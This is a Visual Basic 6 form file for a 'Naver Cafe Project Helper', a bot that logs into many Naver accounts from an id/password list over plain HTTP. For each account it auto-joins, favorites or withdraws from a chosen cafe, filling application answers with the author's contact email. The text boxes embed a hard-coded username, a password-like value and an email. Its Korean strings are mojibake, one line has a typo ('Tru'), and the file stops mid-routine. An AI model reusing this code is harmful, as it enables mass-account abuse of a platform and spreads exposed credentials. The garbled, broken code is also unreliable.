VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.ocx"
Begin VB.Form Form1 
   Appearance      =   0  '���
   BackColor       =   &H80000005&
   BorderStyle     =   1  '���� ����
   Caption         =   "Naver Cafe Project Helper"
   ClientHeight    =   6915
   ClientLeft      =   10845
   ClientTop       =   5625
   ClientWidth     =   5835
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6915
   ScaleWidth      =   5835
   Begin VB.TextBox Text3 
      Height          =   270
      Left            =   7200
      TabIndex        =   30
      Top             =   5280
      Width           =   2535
   End
   Begin VB.CheckBox Check2 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "��α״г����� ī�� �г������� ����"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   2040
      TabIndex        =   29
      Top             =   1080
      Width           =   4095
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "���̵� ī�� �г������� ����"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   2040
      TabIndex        =   28
      Top             =   720
      Width           =   3255
   End
   Begin VB.Timer Timer2 
      Interval        =   30
      Left            =   2880
      Top             =   9120
   End
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Height          =   375
      Left            =   2880
      TabIndex        =   27
      Top             =   8880
      Width           =   3735
      _ExtentX        =   6588
      _ExtentY        =   661
      _Version        =   393216
      Appearance      =   1
   End
   Begin Project1.CandyButton CandyButton7 
      Height          =   495
      Left            =   2040
      TabIndex        =   21
      Top             =   3000
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "�ڵ� ī��ȸ�� Ż�� Start"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton6 
      Height          =   495
      Left            =   2040
      TabIndex        =   20
      Top             =   2400
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "�ڵ� ���ã�� Start"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton5 
      Height          =   375
      Left            =   8280
      TabIndex        =   19
      Top             =   3960
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   661
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "ȭ�� Ű����"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.TrayControl TrayControl1 
      Left            =   8040
      Top             =   7800
      _ExtentX        =   794
      _ExtentY        =   794
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   8400
      Top             =   9480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text6 
      Height          =   270
      Left            =   120
      TabIndex        =   17
      Text            =   "thoyeon@naver.com"
      Top             =   9000
      Width           =   2655
   End
   Begin VB.TextBox Text5 
      Height          =   270
      Left            =   0
      TabIndex        =   16
      Text            =   "DIET50kg"
      Top             =   8640
      Width           =   2655
   End
   Begin VB.TextBox Text4 
      Height          =   270
      Left            =   120
      TabIndex        =   15
      Text            =   "thoyeon"
      Top             =   8280
      Width           =   2655
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser2 
      Height          =   2055
      Left            =   7200
      TabIndex        =   14
      Top             =   7440
      Width           =   2655
      ExtentX         =   4683
      ExtentY         =   3625
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   975
      Left            =   5640
      TabIndex        =   13
      Top             =   9120
      Width           =   1575
      ExtentX         =   2778
      ExtentY         =   1720
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   4200
      Top             =   5280
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   2880
      Top             =   5160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin Project1.CandyButton CandyButton3 
      Height          =   375
      Left            =   7800
      TabIndex        =   11
      Top             =   6600
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "���Ͻ�(VPN) ��ȸ ������ �˻�/����"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton2 
      Height          =   375
      Left            =   7680
      TabIndex        =   10
      Top             =   3120
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "���� ������ ���α׷� �ٿ�ε�"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  '���
      CausesValidation=   0   'False
      Height          =   270
      Left            =   3960
      TabIndex        =   9
      Top             =   1440
      Width           =   1575
   End
   Begin Project1.CandyButton Command3 
      Height          =   495
      Left            =   2040
      TabIndex        =   7
      Top             =   3600
      Width           =   1815
      _ExtentX        =   3201
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "���� ���̵����"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton Command2 
      Height          =   495
      Left            =   120
      TabIndex        =   6
      Top             =   3600
      Width           =   1815
      _ExtentX        =   3201
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "�ٽ� �ҷ�����"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton Command4 
      Height          =   495
      Left            =   3960
      TabIndex        =   5
      Top             =   3600
      Width           =   1695
      _ExtentX        =   2990
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "���ȳ�"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton GO 
      Height          =   495
      Left            =   2040
      TabIndex        =   4
      Top             =   1800
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "�ڵ����� Start"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  '���
      Height          =   270
      Left            =   2040
      TabIndex        =   3
      Text            =   "ī�� ���ּ�"
      Top             =   360
      Width           =   2415
   End
   Begin Project1.CandyButton Caddybutton1 
      Height          =   255
      Left            =   4560
      TabIndex        =   2
      Top             =   360
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "GET"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.ListBox List2 
      Appearance      =   0  '���
      Height          =   2010
      Left            =   120
      TabIndex        =   1
      Top             =   4560
      Width           =   5535
   End
   Begin VB.ListBox List1 
      Appearance      =   0  '���
      Height          =   3090
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   1815
   End
   Begin VB.Label Label7 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "���α׷� ���α�"
      BeginProperty Font 
         Name            =   "����"
         Size            =   9.75
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   26
      Top             =   4200
      Width           =   2055
   End
   Begin VB.Label Label6 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "���̵� ���"
      BeginProperty Font 
         Name            =   "����"
         Size            =   9.75
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   120
      TabIndex        =   25
      Top             =   120
      Width           =   1455
   End
   Begin VB.Label Label5 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "ī�䰡�Դг��� ����:"
      BeginProperty Font 
         Name            =   "����"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   2040
      TabIndex        =   24
      Top             =   1440
      Width           =   2415
   End
   Begin VB.Label Label4 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "Loading..."
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1320
      TabIndex        =   23
      Top             =   6600
      Width           =   4335
   End
   Begin VB.Label Label3 
      Appearance      =   0  '���
      BackColor       =   &H80000005&
      Caption         =   "Loading..."
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   22
      Top             =   6600
      Width           =   2175
   End
   Begin VB.Label frimek 
      Height          =   1455
      Left            =   9000
      TabIndex        =   18
      Top             =   2160
      Width           =   6495
   End
   Begin VB.Label Label2 
      Height          =   375
      Left            =   8640
      TabIndex        =   12
      Top             =   6720
      Width           =   1695
   End
   Begin VB.Label Label1 
      BeginProperty Font 
         Name            =   "����"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   9240
      TabIndex        =   8
      Top             =   7440
      Width           =   2775
   End
   Begin VB.Menu Exit 
      Caption         =   "������"
   End
   Begin VB.Menu Ʈ���̸�� 
      Caption         =   "Ʈ���̸��"
   End
   Begin VB.Menu û���ϱ� 
      Caption         =   "���/�α�û��"
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'-- ���� �ڵ� ���Ա� 2012-11-25 (��) - 2012-11-25 (��) ����
'-- �� �ּ� �� ������ �����ּ���.
'-- ���� & ���� ����
'-- Windows(wez____) # YuSeungHwan
Dim ClubID, WinHttp As New WinHttpRequest
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Dim a, b, C, D


Private Sub Check1_Click()
If Check1.Value = 0 Then Text1.Enabled = True Else Text1.Enabled = False
End Sub

Private Sub CandyButton1_Click()
MsgBox "hollywoodst4r@nate.com", vbInformation, "hollywoodst4r@nate.com"
End Sub


Private Sub CandyButton3_Click()
frmMain.Show
End Sub



'Ʈ������Ʈ�Ѽҽ�

Private Sub Command1_Click()

End Sub

Private Sub CandyButton6_Click()
On Error Resume Next

Dim cafeCookieToken$, clubTempId$, alimCode$, cafeApplyTempSaveapplyanswerstring$, applyQuestionSetno$, i, Temp, NewID, s, arr2() As String

If ClubID = "" Then MsgBox "������ȣ�� �����ּ���.", vbCritical, "�̿�ȳ�": Exit Sub
Label3.Caption = 0: List2.Clear
For s = 0 To List1.ListCount - 1&

GO.Enabled = False: Check1.Enabled = False: Text1.Enabled = False: Text2.Enabled = False: Command1.Enabled = False: Command2.Enabled = False: Command3.Enabled = False

arr2() = Split(List1.List(s), "/")
WinHttp.Open "POST", "http://nid.naver.com/nidlogin.login" '-- ���̹��α���
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&svctype=0&id=" & arr2(0) & "&pw=" & arr2(1)

If InStr(StrConv(WinHttp.ResponseBody, vbUnicode), "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
WinHttp.Open "POST", "http://cafe.naver.com/FavoriteCafeSetupAjax.nhn"
WinHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=utf-8"
WinHttp.SetRequestHeader "Referer", "http://cafe.naver.com/" & Text2.Text & ".cafe"
WinHttp.Send "json=%7Bparams%20%3A%20%7BisInteresting%20%3A%20true%2C%20cafeInfo%20%3A%20%5B%7Bclubid%20%3A%20" & ClubID & "%2C%20isExternal%20%3A%20false%7D%5D%7D%7D&clubId=" & ClubID
List2.AddItem arr2(0) & " ī�� ���ã�� ��Ͽ� �����Ͽ����ϴ�.": Label3.Caption = Label3.Caption + 1
Else
List2.AddItem arr2(0) & " ���̵� �Ǵ� ��й�ȣ�� �ǹٸ����ʽ��ϴ�."
End If

Next s
List2.AddItem "�� " & List1.ListCount - 0 & " ���� ���̵��� " & Label3.Caption & " ���� " & Text2.Text & " ī�� " & " ���ã�� ��Ͽ� �����Ͽ����ϴ�.": List2.ListIndex = List2.ListIndex + 1
Label4.Caption = "���� ���̵� " & Text2.Text & " ī�� ���ã���Ͽ� �����Ͽ����ϴ�."
GO.Enabled = True: Check1.Enabled = True: Text1.Enabled = True: Text2.Enabled = True: Command1.Enabled = True: Command2.Enabled = True: Command3.Enabled = True
End Sub

Private Sub CandyButton7_Click()
On Error Resume Next
'SendIDList
Dim cafeCookieToken$, clubTempId$, alimCode$, cafeApplyTempSaveapplyanswerstring$, applyQuestionSetno$, i, Temp, NewID, s, arr2() As String

If ClubID = "" Then MsgBox "������ȣ�� �����ּ���.", vbCritical, "�̿�ȳ�": Exit Sub
Label3.Caption = 0: List2.Clear
For s = 0 To List1.ListCount - 1&

GO.Enabled = False: Check1.Enabled = False: Text1.Enabled = False: Text2.Enabled = False: Command1.Enabled = False: Command2.Enabled = False: Command3.Enabled = False

arr2() = Split(List1.List(s), "/")
WinHttp.Open "POST", "http://nid.naver.com/nidlogin.login" '-- ���̹��α���
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&svctype=0&id=" & arr2(0) & "&pw=" & arr2(1)

'If InStr(StrConv(WinHttp.ResponseBody, vbUnicode), "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
C = StrConv(WinHttp.ResponseBody, vbUnicode)
D = WinHttp.ResponseText
WinHttp.Open "POST", "http://cafe.naver.com/CafeSecede.nhn"
WinHttp.SetRequestHeader "Referer", "http://cafe.naver.com/CafeSecedeView.nhn?clubid=" & ClubID & "&from=naver_login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "clubid=" & ClubID
WinHttp.WaitForResponse
If InStr(WinHttp.ResponseText, "Ż���ϼ̽��ϴ�.") Then
List2.AddItem arr2(0) & " ī�� Ż�� �����ϼ̽��ϴ�.": Label3.Caption = Label3.Caption + 1
Else
List2.AddItem arr2(0) & " ī�� Ż�� �����Ͽ����ϴ�."

End If

Next s
List2.AddItem "�� " & List1.ListCount - 0 & " ���� ���̵��� " & Label3.Caption & " ���� " & Text2.Text & " ī�� " & "ȸ��Ż�� �����Ͽ����ϴ�.": List2.ListIndex = List2.ListIndex + 1
Label4.Caption = "���� ���̵� " & Text2.Text & " ī��ȸ�� Ż�� �����Ͽ����ϴ�."
GO.Enabled = True: Check1.Enabled = True: Text1.Enabled = True: Text2.Enabled = True: Command1.Enabled = True: Command2.Enabled = True: Command3.Enabled = Tru
End Sub

Private Sub Check2_Click()
If Check2.Value = 0 Then Text1.Enabled = True Else Text1.Enabled = False
End Sub

Private Sub Exit_Click()
Unload Me
End Sub

Private Sub form_mousemove(Button As Integer, Shift As Integer, x As Single, Y As Single)
If x / Screen.TwipsPerPixelX = &H203 Then
    TrayControl1.RestoreFromTray

End If
End Sub


Private Sub CandyButton5_Click()
CKeyBoard.Show
End Sub

Private Sub Caddybutton1_Click()
If Text2 = "" Or Text2 = "ī���ּ�" Then MsgBox "�ڵ������� ī�並 �Է����ּ���.", vbExclamation, "�̿�ȳ�": Exit Sub

WinHttp.Open "GET", "http://cafe.naver.com/" & Text2
WinHttp.Send

If InStr(1, StrConv(WinHttp.ResponseBody, vbUnicode), "�������� ã�� �� �����ϴ�") Then
MsgBox "��û�Ͻ� ī���ּ� �� ���� ī���̰ų� Ȱ���� ������ ī���Դϴ�.", vbExclamation, "�̿�ȳ�"
Exit Sub
ElseIf InStr(1, StrConv(WinHttp.ResponseBody, vbUnicode), "�����Ͻ� ī��� ī�� ����� ���� �� �ֽ��ϴ�.") Then
MsgBox "��û�Ͻ� ī���ּ� �� ī��ȸ���� �� �� �ִ�ī���Դϴ�.", vbExclamation, "�̿�ȳ�"
Exit Sub
ElseIf InStr(1, StrConv(WinHttp.ResponseBody, vbUnicode), "�� ī��� �����Ͻ� �� �����ϴ�.") Then
MsgBox "��û�Ͻ� ī���ּ� �� ���� ��� �Խù��� �ټ� �����ϰ� �־� ������ ���� �� ī���Դϴ�.", vbExclamation, "�̿�ȳ�"
Exit Sub
End If


ClubID = Split(Split(StrConv(WinHttp.ResponseBody, vbUnicode), "MyCafeIntro.nhn?clubid=")(1), """")(0)

MsgBox "������ȣ ���ϱ⿡ �����Ͽ����ϴ�.", vbInformation, "�̿�ȳ�"
End Sub

Private Sub Command2_Click()
List1.Clear: IDLoad
End Sub

Private Sub Command3_Click()
If List1.Text = "" Then MsgBox "������ ���̵� �� �������ּ���.", vbExclamation, "�̿�ȳ�": Exit Sub
List1.RemoveItem List1.ListIndex: Command3.Enabled = False
End Sub

Private Sub Command4_Click()
MsgBox "���α׷� ��� �� ȯ���մϴ�." & vbLf _
& "�� ���α׷� �� Nī�� �ʰ�� ���Ա� �Դϴ�." & vbLf _
& "�Ǹ��� �ƴ� ���̵� ���� ī�� ������ ���ѵɼ��ֽ��ϴ�." & vbLf _
& "����� ī��� �� ���α׷��� �����ϽǼ� �����ϴ�." & vbLf _
& "�簡�� �Ұ� Ż�� ��� ���� �ϽǼ������ϴ�." & vbLf _
& "ī�䰡 �������� ��� �Ŵ����� ������ �����ؾ� ������ �Ϸ�˴ϴ�.", vbInformation
End Sub

Private Sub Form_Load()
IDLoad
IPAdreess
WebBrowser1.Navigate2 "http://www.gagalive.kr/gagalive.swf?chatroom=~~~frimekprograms"
Dim WinHttp As Object '�ѹ��� �����ؿ�
Set WinHttp = CreateObject("Winhttp.WinHttpRequest.5.1")
WinHttp.Open "GET", "http://thoyeon.dothome.co.kr/CafeHelper.txt" '�ڱ��� FTP�ּ�.gm.txt�� ���ְ� FTP�ּҿ� gm.txt�� ����� ON �̶� ������ ����ON�ǰ�  OFF�� ������ OFF�� �ȴ�.
WinHttp.Send '�������� ����
Label2.Caption = StrConv(WinHttp.ResponseBody, vbUnicode) '���̺���ڿ� ������ �ؿ�
If Label2.Caption = "ON" Then '���̺��� ON�̶� ���ִٸ��
Else 'ON�� �ƴ� �ٸ� ��� �����
MsgBox "���α׷��� ���� ������Ʈ�Ǿ����ϴ�.�����ڿ��� ���ǹٶ��ϴ�.", vbCritical, "hollywoodst4r@nate.com"
Unload Me ' �����ݴ´�
End If
End Sub

Private Sub GO_Click()

On Error Resume Next

Dim cafeCookieToken$, clubTempId$, alimCode$, cafeApplyTempSaveapplyanswerstring$, applyQuestionSetno$, i, Temp, NewID, s, arr2() As String

If ClubID = "" Then MsgBox "������ȣ�� �����ּ���.", vbCritical, "�̿�ȳ�": Exit Sub
Label3.Caption = 0: List2.Clear
For s = 0 To List1.ListCount - 1&

GO.Enabled = False: Check1.Enabled = False: Text1.Enabled = False: Text2.Enabled = False: Command1.Enabled = False: Command2.Enabled = False: Command3.Enabled = False

arr2() = Split(List1.List(s), "/")
WinHttp.Open "POST", "http://nid.naver.com/nidlogin.login" '-- ���̹��α���
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&svctype=0&id=" & arr2(0) & "&pw=" & arr2(1)

If InStr(StrConv(WinHttp.ResponseBody, vbUnicode), "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then

WinHttp.Open "GET", "http://admin.blog.naver.com/AdminUserBasic.nhn?blogId=" & arr2(0)
WinHttp.Send
Text3.Text = Split(Split(StrConv(WinHttp.ResponseBody, vbUnicode), "input type=""text"" id=""frmNickname"" name=""nickname"" class=""input_text mgr1"" style=""width:295px;"" value=""")(1), """>")(0)


If Check1.Value = 1 Then NewID = Replace(arr2(0), "_", "") Else NewID = Text1
If Check2.Value = 1 Then NewID = Text3.Text Else NewID = Text1

If Text3.Text = "" Then NewID = Replace(arr2(0), "_", "")

WinHttp.Open "POST", "http://m.cafe.naver.com/CafeApplyView.nhn"
WinHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/17.0 Firefox/17.0"
WinHttp.SetRequestHeader "Referer", "http://m.cafe.naver.com/CafeApply.nhn?clubid=" & ClubID
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "clubid=" & ClubID & "&invalid="
'Open "C:\D4D.TXT" For Output As #1
'Print #1, WinHttp.ResponseText
'Close #1
Temp = WinHttp.ResponseText

cafeCookieToken = Split(Split(WinHttp.ResponseText, "cafeCookieToken"" value=""")(1), """>")(0): cafeCookieToken = Replace(cafeCookieToken, "+", "%2B"): cafeCookieToken = Replace(cafeCookieToken, "/", "%2F")
clubTempId = Split(Split(WinHttp.ResponseText, "clubTempId"" value=""")(1), """ />")(0): clubTempId = Replace(clubTempId, "+", "%2B"): clubTempId = Replace(clubTempId, "/", "%2F")
alimCode = Split(Split(WinHttp.ResponseText, "alimCode"" value=""")(1), """ />")(0): alimCode = Replace(alimCode, "+", "%2B"): alimCode = Replace(alimCode, "/", "%2F")
i = "���Ա⹮�� hollywoodst4r@nate.com%23NHNC%23"

If UBound(Split(WinHttp.ResponseText, "<span class=""q"">")) = 1 Then
cafeApplyTempSaveapplyanswerstring = i
ElseIf UBound(Split(WinHttp.ResponseText, "<span class=""q"">")) = 2 Then
cafeApplyTempSaveapplyanswerstring = i & i
ElseIf UBound(Split(WinHttp.ResponseText, "<span class=""q"">")) = 3 Then
cafeApplyTempSaveapplyanswerstring = i & i & i
ElseIf UBound(Split(WinHttp.ResponseText, "<span class=""q"">")) = 4 Then
cafeApplyTempSaveapplyanswerstring = i & i & i & i
ElseIf UBound(Split(WinHttp.ResponseText, "<span class=""q"">")) = 5 Then
cafeApplyTempSaveapplyanswerstring = i & i & i & i & i

End If
applyQuestionSetno = Split(Split(WinHttp.ResponseText, "cafeApplyTempSave.applyQuestionSetno"" value=""")(1), """>")(0)


WinHttp.Open "POST", "http://m.cafe.naver.com/CafeApplyViewResult.nhn"
WinHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/17.0 Firefox/17.0"
WinHttp.SetRequestHeader "Referer", "http://m.cafe.naver.com/CafeApplyView.nhn"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
If InStr(WinHttp.ResponseText, "ī����</a>�� �����մϴ�.<span>ī������ �������ּ���.</span>") Then '-- ���� ���̹��� ������ ù ���Ǵ� ���̵���
WinHttp.Send "webworkCookieTokenName=cafeCookieToken&cafeCookieToken=" & cafeCookieToken & "&clubTempId=" & clubTempId & "&alimCode=" & alimCode & "&clubid=" & ClubID & "&cluburl=&boardFeedId=&cafeApplyTempSave.applyanswerstring=" & cafeApplyTempSaveapplyanswerstring & "&cafeApplyTempSave.applyQuestionSetno=" & applyQuestionSetno & "&rewrite=&cafeApplyTempSave.nickname=" & NewID & "&cafeApplyTempSave.agreecheck=Y"
'-- ī�� �̿뿡 �����ϵ��� �����Ѵ�.
If InStr(WinHttp.ResponseText, "ī�� ����</strong>�� �Ϸ�Ǿ����ϴ�.") Then List2.AddItem arr2(0) & " ���Կ� �����Ͽ����ϴ�.": Label3.Caption = Label3.Caption + 1
Else
WinHttp.Send "webworkCookieTokenName=cafeCookieToken&cafeCookieToken=" & cafeCookieToken & "&clubTempId=" & clubTempId & "&alimCode=" & alimCode & "&clubid=" & ClubID & "&cluburl=&boardFeedId=&cafeApplyTempSave.applyanswerstring=" & cafeApplyTempSaveapplyanswerstring & "&cafeApplyTempSave.applyQuestionSetno=" & applyQuestionSetno & "&rewrite=&cafeApplyTempSave.nickname=" & NewID
If InStr(WinHttp.ResponseText, "ī�� ����</strong>�� �Ϸ�Ǿ����ϴ�.") Then List2.AddItem arr2(0) & " ���Կ� �����Ͽ����ϴ�.": Label3.Caption = Label3.Caption + 1
